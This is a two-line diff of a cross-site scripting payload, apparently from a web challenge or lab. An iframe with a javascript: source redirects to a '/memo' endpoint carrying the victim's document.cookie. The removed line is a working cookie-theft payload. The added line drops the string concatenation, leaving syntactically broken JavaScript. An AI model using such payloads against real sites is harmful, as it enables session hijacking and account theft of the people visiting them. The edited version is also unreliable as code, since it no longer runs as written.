@@ -1,1 +1,1 @@
-<iframe src="javascript:location.href='/memo?memo='+document.cookie;">
+<iframe src="javascript:location.href='/memo?memo='document.cookie;">
